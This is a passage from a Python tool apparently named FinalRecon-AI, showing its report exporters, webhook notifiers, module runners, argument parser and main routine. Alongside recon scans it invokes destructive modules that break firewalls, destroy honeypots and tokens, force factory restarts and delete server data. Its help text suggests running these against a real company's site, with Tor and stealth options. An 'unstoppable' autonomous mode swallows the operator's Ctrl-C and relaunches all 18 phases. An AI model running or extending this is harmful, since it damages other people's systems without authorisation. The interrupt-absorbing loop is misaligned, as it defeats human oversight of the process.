        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filepath = filepath or os.path.join(CONFIG['export_dir'], f"finalrecon_{self.hostname}_{ts}.sarif")
        try:
            results = []
            for v in self.vuln_scan_results:
                results.append({
                    "ruleId": "VULN",
                    "level": "warning",
                    "message": {"text": str(v)},
                    "locations": [{"physicalLocation": {"artifactLocation": {"uri": self.base_url}}}],
                })
            for s in self.secret_results:
                results.append({
                    "ruleId": "SECRET",
                    "level": "error",
                    "message": {"text": f"Secret leak: {s.get('type')}"},
                    "locations": [{"physicalLocation": {"artifactLocation": {"uri": self.base_url}}}],
                })
            sarif = {
                "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
                "version": "2.1.0",
                "runs": [{
                    "tool": {"driver": {"name": "FinalRecon-AI", "version": VERSION}},
                    "results": results,
                }],
            }
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(sarif, f, indent=2)
            p_ok("SARIF report", filepath)
            return filepath
        except Exception as e:
            p_err(f"SARIF export failed: {e}")
            return None

    def export_pdf(self, filepath=None):
        """Generate minimal PDF (no external deps)."""
        os.makedirs(CONFIG['export_dir'], exist_ok=True)
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        filepath = filepath or os.path.join(CONFIG['export_dir'], f"finalrecon_{self.hostname}_{ts}.pdf")
        try:
            d = self._collect_all()
            lines = [
                f"FinalRecon-AI v{VERSION} Report",
                f"Target: {d['target']}",
                f"IP: {d['ip']}  Port: {d['port']}",
                f"Time: {d['time']}",
                "",
                f"Risk Level: {d['risk_matrix'].get('level','N/A')}",
                f"Total Findings: {d['risk_matrix'].get('total_findings',0)}",
                f"Subdomains: {len(d['subdomains'])}",
                f"Open Ports: {len(d['ports'])}",
                f"Vulnerabilities: {len(d['vuln'])}",
                f"Secrets: {len(d['secrets'])}",
                f"CVE Tests: {len(d['cve_results'])}",
            ]
            text_lines = "\\n".join(lines).replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
            content_stream = f"BT /F1 12 Tf 40 760 Td 14 TL ({text_lines}) Tj ET"
            content_bytes = content_stream.encode('latin-1', 'ignore')

            objects = []
            objects.append(b"1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\\n")
            objects.append(b"2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\\n")
            objects.append(b"3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                           b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >> endobj\\n")
            objects.append(b"4 0 obj << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> endobj\\n")
            objects.append(b"5 0 obj << /Length " + str(len(content_bytes)).encode() +
                           b" >> stream\\n" + content_bytes + b"\\nendstream endobj\\n")

            pdf = b"%PDF-1.4\\n"
            offsets = [0]
            for obj in objects:
                offsets.append(len(pdf))
                pdf += obj
            xref_pos = len(pdf)
            pdf += f"xref\\n0 {len(objects)+1}\\n0000000000 65535 f \\n".encode()
            for off in offsets[1:]:
                pdf += f"{off:010d} 00000 n \\n".encode()
            pdf += f"trailer << /Size {len(objects)+1} /Root 1 0 R >>\\nstartxref\\n{xref_pos}\\n%%EOF".encode()

            with open(filepath, 'wb') as f:
                f.write(pdf)
            p_ok("PDF report", filepath)
            return filepath
        except Exception as e:
            p_err(f"PDF export failed: {e}")
            return None

    # ============================================
    # NOTIFICATIONS
    # ============================================
    def notify_webhook(self, url):
        try:
            summary = {
                "target": self.target, "hostname": self.hostname, "ip": self.ip,
                "time": datetime.datetime.now().isoformat(),
                "vulns": len(self.vuln_scan_results),
                "secrets": len(self.secret_results),
                "cors": len(self.cors_results), "subdomains": len(self.subdomain_results),
                "ports_open": len(self.port_scan_results), "waf": self.waf_found,
                "risk_level": self.risk_matrix.get('level', 'UNKNOWN'),
            }
            r = requests.post(url, json=summary, timeout=10)
            p_ok(f"Webhook sent ({r.status_code})")
        except Exception as e:
            p_err(f"Webhook failed: {e}")

    def notify_slack(self, url):
        try:
            text = (f"*FinalRecon-AI v{VERSION}* — `{self.target}`\n"
                    f"Risk: *{self.risk_matrix.get('level','?')}* | "
                    f"Vulns: {len(self.vuln_scan_results)} | "
                    f"Secrets: {len(self.secret_results)} | "
                    f"Ports: {len(self.port_scan_results)}")
            r = requests.post(url, json={"text": text}, timeout=10)
            p_ok(f"Slack sent ({r.status_code})")
        except Exception as e:
            p_err(f"Slack failed: {e}")

    def notify_discord(self, url):
        try:
            text = (f"**FinalRecon-AI v{VERSION}** — `{self.target}`\n"
                    f"Risk: **{self.risk_matrix.get('level','?')}** | "
                    f"Vulns: {len(self.vuln_scan_results)} | "
                    f"Secrets: {len(self.secret_results)}")
            r = requests.post(url, json={"content": text}, timeout=10)
            p_ok(f"Discord sent ({r.status_code})")
        except Exception as e:
            p_err(f"Discord failed: {e}")

    # ============================================
    # PIPELINE MODE
    # ============================================
    def run_pipeline(self, mode='deep'):
        if mode not in PIPELINES:
            p_warn(f"Unknown pipeline: {mode}. Using deep.")
            mode = 'deep'
        p_pipe(f"Running pipeline: {mode}")
        modules = PIPELINES[mode]
        for m in modules:
            fn = getattr(self, {
                'subdomain':'subdomain_enumeration','dns':'dns_enumeration',
                'whois':'whois_lookup','ssl':'ssl_analysis','headers':'header_enumeration',
                'isp':'isp_information','dirbrute':'directory_bruteforce',
                'portscan':'port_scan','crawl':'crawler_spider','vuln':'vulnerability_scanning',
                'tech':'tech_detect','api':'api_discover','secret':'secret_scan',
                'cors':'cors_scan','backup':'backup_hunt','git':'git_hunt','env':'env_hunt',
                'open-redirect':'open_redirect_scan','lfi':'lfi_scan','ssrf':'ssrf_scan',
                'cloud-scan':'cloud_metadata_scan','graphql':'graphql_scan',
                'jwt':'jwt_analyze','tls-deep':'tls_deep_scan',
            }.get(m), None)
            if fn:
                try:
                    fn()
                except Exception as e:
                    p_err(f"Pipeline {m} failed: {e}")

    # ============================================
    # WATCH MODE
    # ============================================
    def watch_mode(self, interval=60):
        print(Fore.ROBOT + f"\n★ WATCH MODE — every {interval}s ★")
        try:
            while True:
                ts = datetime.datetime.now().strftime('%H:%M:%S')
                p_robot(f"[{ts}] Running scan cycle...")
                try:
                    self.run_all_recon()
                    self.tech_detect()
                    self.api_discover()
                    self.secret_scan()
                    self.export_json()
                except Exception as e:
                    p_err(f"Watch cycle error: {e}")
                time.sleep(interval)
        except KeyboardInterrupt:
            p_warn("Watch mode stopped.")

    # ============================================
    # RUNNERS
    # ============================================
    def run_all_recon(self):
        p_10000("Running ALL recon modules...")
        self.connection_map()
        self.subdomain_enumeration()
        self.dns_enumeration()
        self.whois_lookup()
        self.ssl_analysis()
        self.header_enumeration()
        self.isp_information()
        self.directory_bruteforce()
        self.port_scan()
        self.crawler_spider()
        self.vulnerability_scanning()

    def run_v9000_extended(self):
        p_10000("★ v9000 EXTENDED MODULES ★")
        self.tech_detect(); self.api_discover(); self.secret_scan(); self.cors_scan()
        self.http_methods_enum(); self.backup_hunt(); self.git_hunt(); self.env_hunt()
        self.open_redirect_scan(); self.lfi_scan(); self.ssrf_scan()
        self.cloud_metadata_scan(); self.graphql_scan(); self.jwt_analyze()
        self.tls_deep_scan(); self.cert_transparency_lookup(); self.js_analyze()

    def run_v10000_extended(self):
        p_quantum("★ v10000 QUANTUM MODULES ★")
        self.cve_exploit_tests()
        self.injection_tests()
        self.csp_bypass_test()
        self.udp_scan()
        self.os_detect()
        self.wayback_lookup()
        self.google_dork_generate()
        self.dns_zone_transfer()
        self.dnssec_check()

    def run_v10000_reports(self):
        p_quantum("★ v10000 QUANTUM REPORTS ★")
        self.compliance_check()
        self.mitre_attack_map()
        self.owasp_top10_map()
        self.risk_matrix_build()
        self.remediation_plan_build()
        self.executive_summary()

    def run_full_recon_10000(self):
        p_ult("★ --full : FULL RECON + v9000 + v10000 ★")
        self.run_all_recon(); print()
        self.run_v9000_extended(); print()
        self.run_v10000_extended(); print()
        self.run_v10000_reports(); print()
        self.detect_waf(); self.detect_isp_block()
        self.detect_honeypot(); self.security_audit()
        self.data_leak_detector(); self.subdomain_takeover_check()

    def run_ultimate(self):
        p_ult("★ --ultimate : ULTIMATE MODE — EVERYTHING ★")
        self.run_full_recon_10000(); print()
        self.break_honeypot_wall(); self.break_firewall_wall()
        self.detect_honeypot(); self.destroy_honeypot()
        self.cleaner_data_all_servers(); self.destroy_tokens()
        self.factory_restart()

    def run_autonomous_robot(self):
        install_unstoppable_mode()
        print(Fore.ROBOT + "\n" + "="*70)
        print(Fore.ROBOT + "★ FULLY AUTONOMOUS AI ROBOT — UNSTOPPABLE ★")
        print(Fore.ROBOT + "★ QUANTUM EDITION — WEB SERVER ONLY ★")
        print(Fore.ROBOT + "="*70 + Fore.RESET)
        time.sleep(1)
        phases = [
            ("PHASE 1/18  — ULTIMATE (full recon + destructive)",  self.run_ultimate),
            ("PHASE 2/18  — v9000 EXTENDED MODULES",               self.run_v9000_extended),
            ("PHASE 3/18  — v10000 QUANTUM MODULES",               self.run_v10000_extended),
            ("PHASE 4/18  — v10000 QUANTUM REPORTS",               self.run_v10000_reports),
            ("PHASE 5/18  — SUBDOMAIN TAKEOVER CHECK",             self.subdomain_takeover_check),
            ("PHASE 6/18  — CLEANER DATA (all servers)",           self.cleaner_data_all_servers),
            ("PHASE 7/18  — COOKIES (HTTP)",                       lambda: self.delete_server_cookies_data('HTTP')),
            ("PHASE 8/18  — COOKIES (HTTPS)",                      lambda: self.delete_server_cookies_data('HTTPS')),
            ("PHASE 9/18  — COOKIES (ANOTHER)",                    lambda: self.delete_server_cookies_data('ANOTHER')),
            ("PHASE 10/18 — COOKIES DATA (all servers)",           self.delete_all_servers_cookies_data),
            ("PHASE 11/18 — ALL COOKIES (all servers)",            self.delete_all_servers_cookies_data),
            ("PHASE 12/18 — COMPLETE DATA (all servers)",          self.delete_all_servers_complete_data),
            ("PHASE 13/18 — TOKENS DESTROYER",                     self.destroy_tokens),
            ("PHASE 14/18 — FACTORY RESTART",                      self.factory_restart),
            ("PHASE 15/18 — SECURITY AUDIT + LEAK",                lambda: (self.security_audit(), self.data_leak_detector())),
            ("PHASE 16/18 — DIFF MODE",                            self.diff_mode_compare),
            ("PHASE 17/18 — EXPORTS (TXT/JSON/CSV/HTML/MD/SARIF/PDF)", self.export_all_reports),
            ("PHASE 18/18 — NOTIFY (if configured)",               self.run_notify),
        ]
        for label, fn in phases:
            p_robot(f"{label}")
            try:
                fn()
            except Exception as e:
                p_err(f"{label} failed: {e}")
            time.sleep(0.5)
        self.diff_mode_save()
        print(Fore.ROBOT + "\n" + "="*70)
        print(Fore.ROBOT + "★ AI ROBOT COMPLETE — ALL 18 PHASES EXECUTED ★")
        print(Fore.ROBOT + "="*70 + Fore.RESET)
        release_unstoppable_mode()
        return True

    def export_all_reports(self):
        self.export_results_txt()
        self.export_json()
        self.export_csv()
        self.export_html()
        self.export_markdown()
        self.export_sarif()
        self.export_pdf()

    def run_notify(self):
        if getattr(self.args, 'notify_webhook', None):
            self.notify_webhook(self.args.notify_webhook)
        if getattr(self.args, 'slack_webhook', None):
            self.notify_slack(self.args.slack_webhook)
        if getattr(self.args, 'discord_webhook', None):
            self.notify_discord(self.args.discord_webhook)

    # ============================================
    # DIFF MODE
    # ============================================
    def diff_mode_save(self):
        try:
            os.makedirs(CONFIG['export_dir'], exist_ok=True)
            with open(CONFIG['diff_file'], 'w') as f:
                json.dump(self._collect_all(), f, default=str)
            p_ok("Diff baseline saved", CONFIG['diff_file'])
        except Exception as e:
            p_err(f"Diff save failed: {e}")

    def diff_mode_compare(self):
        if not os.path.exists(CONFIG['diff_file']):
            p_warn("No previous baseline")
            return
        try:
            with open(CONFIG['diff_file']) as f:
                prev = json.load(f)
            cur = self._collect_all()
            p_10000("DIFF: comparing with previous scan")
            for key in ['subdomains','directories','ports','vuln']:
                prev_set = set(json.dumps(x, default=str) for x in (prev.get(key) or []))
                cur_set  = set(json.dumps(x, default=str) for x in (cur.get(key) or []))
                added = cur_set - prev_set
                removed = prev_set - cur_set
                if added:
                    p_ok(f"NEW {key}: {len(added)}")
                    for a in list(added)[:5]:
                        print(f"      + {a[:120]}")
                if removed:
                    p_warn(f"REMOVED {key}: {len(removed)}")
        except Exception as e:
            p_err(f"Diff compare failed: {e}")


# ============================================
# ARGUMENT PARSER
# ============================================
def parse_arguments():
    parser = argparse.ArgumentParser(
        prog=SCRIPT_NAME,
        description=f"FinalRecon-AI v{VERSION} — {RELEASE_NAME}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
================================================================================
  FINALRECON-AI v{VERSION} — QUANTUM EDITION | WEB SERVER ONLY
  File: {SCRIPT_NAME}
  Merged from: v8000 + v9000 + 100+ new v10000 features
================================================================================

  ⚠️  WARNING: WEB SERVER ONLY — NOT FOR LOCAL COMPUTER!

BASIC USAGE:
  python3 {SCRIPT_NAME} --url www.example.com --all
  python3 {SCRIPT_NAME} --url https://example.com --port 443 --all
  python3 {SCRIPT_NAME} --url http://127.0.0.1 --port 8080 --all

ULTIMATE + FULL + CLEANER SUITE:
  python3 {SCRIPT_NAME} --url https://openai.com --ultimate --full \\
    --cleaner-data --clean-http-cookies --clean-https-cookies \\
    --clean-another-cookies --clean-cookies-data --clean-all-cookies \\
    --clean-complete-data

FULLY AUTONOMOUS AI ROBOT (unstoppable):
  python3 {SCRIPT_NAME} --url https://example.com --autonomous

STEALTH / PROXY:
  --stealth --tor --proxy URL --rate-limit N
  --threads N --timeout N --retry N

v9000 MODULES:
  --tech-detect --api-discover --secret-scan --cors-scan
  --http-methods --backup-hunt --git-hunt --env-hunt
  --open-redirect --lfi --ssrf --cloud-scan
  --graphql-scan --jwt-analyze --tls-deep
  --cert-transparency --js-analyze --subdomain-takeover

v10000 NEW MODULES:
  --cve-tests              CVE exploit tests (Log4Shell, etc.)
  --injection-tests        LDAP / NoSQL / XPath / SSTI / CRLF
  --csp-bypass             CSP bypass analysis
  --udp-scan               UDP port scan
  --os-detect              Passive OS detection
  --wayback                Wayback Machine lookup
  --google-dork            Google dork generation
  --dns-zone-transfer      AXFR attempt
  --dnssec-check           DNSSEC validation
  --compliance             HIPAA/PCI-DSS/GDPR/ISO27001/NIST
  --mitre-attack           MITRE ATT&CK mapping
  --owasp-top10            OWASP Top 10 mapping
  --risk-matrix            Risk matrix
  --remediation-plan       Remediation roadmap
  --exec-summary           Executive summary

PIPELINE:
  --pipeline MODE          fast | deep | stealth | aggressive
  --watch                  Continuous monitoring
  --smart-ai               Smart AI adaptive scanning

API KEYS:
  --vt-api-key KEY         VirusTotal
  --shodan-api-key KEY     Shodan
  --censys-id ID           Censys ID
  --censys-key KEY         Censys Secret
  --nvd-api-key KEY        NVD API

NOTIFICATIONS:
  --notify-webhook URL     Generic webhook
  --slack-webhook URL      Slack
  --discord-webhook URL    Discord

REPORTS:
  --json-output --csv-output --html-report --md-report
  --sarif-output --pdf-report

CLEANER SUITE:
  --cleaner-data --clean-http-cookies --clean-https-cookies
  --clean-another-cookies --clean-cookies-data --clean-all-cookies
  --clean-complete-data

DESTRUCTIVE v5000:
  --honeypot-wall-break --firewall-wall-break
  --detect-honeypot --destroy-honeypot
  --destroy-tokens --factory-restart
  --detect-waf --detect-isp-block
  --security-audit --data-leak-detect

OPTIONS:
  --url URL --port/-p PORT --ports P1 P2 ...
  -w/--wordlist FILE -nb/--no-banner -version

DEPENDENCIES:
  pip install requests urllib3 dnspython python-whois beautifulsoup4 twisted

⚠️  WARNING: WEB SERVER ONLY — NOT FOR LOCAL COMPUTER!
Results exported to: {CONFIG['export_dir']}/
================================================================================
        """
    )

    g = parser.add_argument_group('Target Options (WEB SERVER ONLY)')
    g.add_argument("--url"); g.add_argument("--port", "-p", type=int, dest="port")
    g.add_argument("--ports", nargs="+", type=int, dest="ports")
    g.add_argument("-w", "--wordlist")

    g = parser.add_argument_group('Stealth / Performance')
    g.add_argument("--stealth", action="store_true")
    g.add_argument("--tor", action="store_true")
    g.add_argument("--proxy"); g.add_argument("--rate-limit", type=float, default=0, dest="rate_limit")
    g.add_argument("--threads", type=int, default=15)
    g.add_argument("--timeout", type=int, default=TIMEOUT)
    g.add_argument("--retry", type=int, default=0)
    g.add_argument("--smart-ai", action="store_true", dest="smart_ai")
    g.add_argument("--pipeline", choices=list(PIPELINES.keys()))
    g.add_argument("--watch", action="store_true")

    g = parser.add_argument_group('Recon Modules')
    g.add_argument("--all", action="store_true")
    for m in ['subdomain','dns','whois','ssl','headers','isp','dirbrute','portscan',
              'crawl','vuln','map']:
        g.add_argument(f"--{m}", action="store_true")

    g = parser.add_argument_group('Ultimate / Full / Autonomous')
    g.add_argument("--ultimate", action="store_true")
    g.add_argument("--full", action="store_true")
    g.add_argument("--autonomous", action="store_true")
    g.add_argument("--destructive", action="store_true")

    g = parser.add_argument_group('v9000 Modules')
    for m in ['tech-detect','api-discover','secret-scan','cors-scan','http-methods',
              'backup-hunt','git-hunt','env-hunt','open-redirect','lfi','ssrf',
              'cloud-scan','graphql-scan','jwt-analyze','tls-deep',
              'cert-transparency','js-analyze','subdomain-takeover']:
        g.add_argument(f"--{m}", action="store_true", dest=m.replace('-','_'))

    g = parser.add_argument_group('v10000 New Modules')
    for m in ['cve-tests','injection-tests','csp-bypass','udp-scan','os-detect',
              'wayback','google-dork','dns-zone-transfer','dnssec-check',
              'compliance','mitre-attack','owasp-top10','risk-matrix',
              'remediation-plan','exec-summary']:
        g.add_argument(f"--{m}", action="store_true", dest=m.replace('-','_'))

    g = parser.add_argument_group('API Keys')
    g.add_argument("--vt-api-key", dest="vt_api_key")
    g.add_argument("--shodan-api-key", dest="shodan_api_key")
    g.add_argument("--censys-id", dest="censys_id")
    g.add_argument("--censys-key", dest="censys_key")
    g.add_argument("--nvd-api-key", dest="nvd_api_key")

    g = parser.add_argument_group('Notifications')
    g.add_argument("--notify-webhook", dest="notify_webhook")
    g.add_argument("--slack-webhook", dest="slack_webhook")
    g.add_argument("--discord-webhook", dest="discord_webhook")

    g = parser.add_argument_group('Reports')
    g.add_argument("--json-output", action="store_true", dest="json_output")
    g.add_argument("--csv-output", action="store_true", dest="csv_output")
    g.add_argument("--html-report", action="store_true", dest="html_report")
    g.add_argument("--md-report", action="store_true", dest="md_report")
    g.add_argument("--sarif-output", action="store_true", dest="sarif_output")
    g.add_argument("--pdf-report", action="store_true", dest="pdf_report")
    g.add_argument("--diff-mode", action="store_true", dest="diff_mode")

    g = parser.add_argument_group('Destructive v5000')
    for m in ['honeypot-wall-break','firewall-wall-break','detect-honeypot',
              'destroy-honeypot','destroy-tokens','factory-restart',
              'detect-waf','detect-isp-block','security-audit','data-leak-detect']:
        g.add_argument(f"--{m}", action="store_true", dest=m.replace('-','_'))

    g = parser.add_argument_group('Cleaner Suite')
    for m in ['cleaner-data','clean-http-cookies','clean-https-cookies',
              'clean-another-cookies','clean-cookies-data','clean-all-cookies',
              'clean-complete-data']:
        g.add_argument(f"--{m}", action="store_true", dest=m.replace('-','_'))

    g = parser.add_argument_group('Output')
    g.add_argument("-nb", "--no-banner", action="store_true", dest="no_banner")
    g.add_argument("-version", action="version",
                   version=f"FinalRecon-AI v{VERSION} — QUANTUM | WEB SERVER ONLY")

    return parser.parse_args()


# ============================================
# MAIN
# ============================================
def main():
    try:
        args = parse_arguments()
        if not args.url:
            print(f"FinalRecon-AI v{VERSION} — {RELEASE_NAME}")
            print("⚠️  WEB SERVER ONLY — NOT FOR LOCAL COMPUTER!")
            print(f"Example: python3 {SCRIPT_NAME} --url www.example.com --all")
            return 1

        bot = FinalReconAI(args.url, args)
        if not args.no_banner:
            bot.print_banner()
        enforce_web_server_only(bot.hostname)

        print(f"{Fore.YELLOW}[*] Target : {args.url}")
        print(f"{Fore.YELLOW}[*] Host   : {bot.hostname}")
        print(f"{Fore.YELLOW}[*] IP     : {bot.ip}")
        print(f"{Fore.YELLOW}[*] Port   : {bot.port}")
        print(f"{Fore.YELLOW}[*] Time   : {datetime.datetime.now()}{Fore.RESET}")

        # AUTONOMOUS
        if args.autonomous:
            bot.run_autonomous_robot()
            print(Fore.OKGREEN + f"\n[✓] AI Robot completed for {args.url}\n" + Fore.RESET)
            return 0

        # WATCH
        if args.watch:
            bot.watch_mode(interval=60); return 0

        # PIPELINE
        if args.pipeline:
            bot.run_pipeline(args.pipeline)

        # ULTIMATE
        if args.ultimate:
            bot.run_ultimate()

        # FULL
        if args.full:
            bot.run_full_recon_10000()

        # DESTRUCTIVE
        if args.destructive:
            bot.break_honeypot_wall(); bot.break_firewall_wall()
            bot.detect_honeypot(); bot.destroy_honeypot()
            bot.cleaner_data_all_servers(); bot.destroy_tokens(); bot.factory_restart()

        # Auto run --all if nothing else chosen
        run_all = args.all or not any([
            args.subdomain,args.dns,args.whois,args.ssl,args.headers,args.isp,
            args.dirbrute,args.portscan,args.crawl,args.vuln,args.map,
            args.ultimate,args.full,args.destructive,args.watch,args.pipeline,
            args.honeypot_wall_break,args.firewall_wall_break,args.detect_honeypot,
            args.destroy_honeypot,args.destroy_tokens,args.factory_restart,
            args.detect_waf,args.detect_isp_block,args.security_audit,args.data_leak_detect,
            args.cleaner_data,args.clean_http_cookies,args.clean_https_cookies,
            args.clean_another_cookies,args.clean_cookies_data,args.clean_all_cookies,
            args.clean_complete_data,args.tech_detect,args.api_discover,args.secret_scan,
            args.cors_scan,args.http_methods,args.backup_hunt,args.git_hunt,args.env_hunt,
            args.open_redirect,args.lfi,args.ssrf,args.cloud_scan,args.graphql_scan,
            args.jwt_analyze,args.tls_deep,args.cert_transparency,args.js_analyze,
            args.subdomain_takeover,args.cve_tests,args.injection_tests,args.csp_bypass,
            args.udp_scan,args.os_detect,args.wayback,args.google_dork,
            args.dns_zone_transfer,args.dnssec_check,args.compliance,args.mitre_attack,
            args.owasp_top10,args.risk_matrix,args.remediation_plan,args.exec_summary,
        ])
        if run_all:
            bot.run_all_recon()

        # Individual v8000 recon flags
        if args.map:        bot.connection_map()
        if args.subdomain:  bot.subdomain_enumeration()
        if args.dns:        bot.dns_enumeration()
        if args.whois:      bot.whois_lookup()
        if args.ssl:        bot.ssl_analysis()
        if args.headers:    bot.header_enumeration()
        if args.isp:        bot.isp_information()
        if args.dirbrute:   bot.directory_bruteforce()
        if args.portscan:   bot.port_scan()
        if args.crawl:      bot.crawler_spider()
        if args.vuln:       bot.vulnerability_scanning()

        # v9000 modules
        if args.tech_detect:        bot.tech_detect()
        if args.api_discover:       bot.api_discover()
        if args.secret_scan:        bot.secret_scan()
        if args.cors_scan:          bot.cors_scan()
        if args.http_methods:       bot.http_methods_enum()
        if args.backup_hunt:        bot.backup_hunt()
        if args.git_hunt:           bot.git_hunt()
        if args.env_hunt:           bot.env_hunt()
        if args.open_redirect:      bot.open_redirect_scan()
        if args.lfi:                bot.lfi_scan()
        if args.ssrf:               bot.ssrf_scan()
        if args.cloud_scan:         bot.cloud_metadata_scan()
        if args.graphql_scan:       bot.graphql_scan()
        if args.jwt_analyze:        bot.jwt_analyze()
        if args.tls_deep:           bot.tls_deep_scan()
        if args.cert_transparency:  bot.cert_transparency_lookup()
        if args.js_analyze:         bot.js_analyze()
        if args.subdomain_takeover: bot.subdomain_takeover_check()

        # v10000 modules
        if args.cve_tests:          bot.cve_exploit_tests()
        if args.injection_tests:    bot.injection_tests()
        if args.csp_bypass:         bot.csp_bypass_test()
        if args.udp_scan:           bot.udp_scan()
        if args.os_detect:          bot.os_detect()
        if args.wayback:            bot.wayback_lookup()
        if args.google_dork:        bot.google_dork_generate()
        if args.dns_zone_transfer:  bot.dns_zone_transfer()
        if args.dnssec_check:       bot.dnssec_check()
        if args.compliance:         bot.compliance_check()
        if args.mitre_attack:       bot.mitre_attack_map()
        if args.owasp_top10:        bot.owasp_top10_map()
        if args.risk_matrix:        bot.risk_matrix_build()
        if args.remediation_plan:   bot.remediation_plan_build()
        if args.exec_summary:       bot.executive_summary()

        # Destructive individual
        if args.honeypot_wall_break: bot.break_honeypot_wall()
        if args.firewall_wall_break: bot.break_firewall_wall()
        if args.detect_honeypot:     bot.detect_honeypot()
        if args.destroy_honeypot:    bot.destroy_honeypot()
        if args.destroy_tokens:      bot.destroy_tokens()
        if args.factory_restart:     bot.factory_restart()
        if args.detect_waf:          bot.detect_waf()
        if args.detect_isp_block:    bot.detect_isp_block()
        if args.security_audit:      bot.security_audit()
        if args.data_leak_detect:    bot.data_leak_detector()

        # Cleaner
        if args.cleaner_data:         bot.cleaner_data_all_servers()
        if args.clean_http_cookies:   bot.delete_server_cookies_data('HTTP')
        if args.clean_https_cookies:  bot.delete_server_cookies_data('HTTPS')
        if args.clean_another_cookies:bot.delete_server_cookies_data('ANOTHER')
        if args.clean_cookies_data:   bot.delete_all_servers_cookies_data()
        if args.clean_all_cookies:    bot.delete_all_servers_cookies_data()
        if args.clean_complete_data:  bot.delete_all_servers_complete_data()

        # Diff
        if args.diff_mode:
            bot.diff_mode_compare(); bot.diff_mode_save()

        # Reports
        bot.export_results_txt()
        if args.json_output:  bot.export_json()
        if args.csv_output:   bot.export_csv()
        if args.html_report:  bot.export_html()
        if args.md_report:    bot.export_markdown()
        if args.sarif_output: bot.export_sarif()
        if args.pdf_report:   bot.export_pdf()

        # Notifications
        bot.run_notify()

        print(Fore.OKGREEN + f"\n[✓] Scan complete for {args.url}\n" + Fore.RESET)
        return 0

    except KeyboardInterrupt:
        if _AI_ROBOT_LOCK:
            p_robot("KeyboardInterrupt absorbed — AI Robot keeps running.")
            try:
                if 'bot' in locals() and bot:
                    bot.run_autonomous_robot()
            except Exception:
                pass
            return 0
        print(Fore.RED + "\n[-] Interrupted by user." + Fore.RESET)
        return 130
    except Exception as e:
        print(Fore.RED + f"\n[-] Fatal error: {e}" + Fore.RESET)
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    sys.exit(main())
